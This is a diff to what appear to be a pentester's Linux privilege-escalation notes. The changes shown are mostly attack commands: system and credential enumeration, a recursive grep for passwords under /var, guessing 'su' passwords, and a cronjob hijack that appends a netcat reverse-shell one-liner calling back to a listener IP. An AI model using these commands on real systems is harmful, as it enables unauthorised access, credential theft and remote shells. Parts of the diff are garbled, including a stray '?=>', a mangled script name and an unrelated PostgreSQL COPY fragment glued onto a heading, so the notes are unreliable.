@@ -12,9 +12,12 @@ cat /etc/issue
 cat /etc/os-release
 uname -a
 getent passwd
-getent group
+getent group # Look for interesting groups that users have access to
 getfacl /srv/git
 ```
+
+
+grep -ri "password" /var 2>/dev/null, ?=>
 
 #### Looking at Root Processes & Clear-Text Passwords
 
@@ -45,7 +48,7 @@ You can display active network connections and listening ports using either nets
 ```bash
 ss -anp
 ss -lntp
-netstat -anp
+netstat -antup
 sudo netstat -ltnp
 ```
 
@@ -236,7 +239,7 @@ One way to abuse a cronjob is to insert a reverse one-liner:
 
 ```bash
 echo >> user_backups.sh
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_eaiuebackups.sh
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.238 1234 >/tmp/f" >> user_eaiuebackups.sh
 ```
 
 ```bash
@@ -468,4 +471,4 @@ If you have access to any source code that you can run as admin or another user,
 
 Make sure that you investigate the logs folder whenever you run into a .git. Of course, also run git show and git log (redundant).
 
-#### Don't forget to test 'su' as any other user with shell: without password and with their names as password 
+#### Don't forget to test 'su' as any other user with shell: without password and with their names as password COPY demo from '/dev/shm/PostgreSQL.317703146';
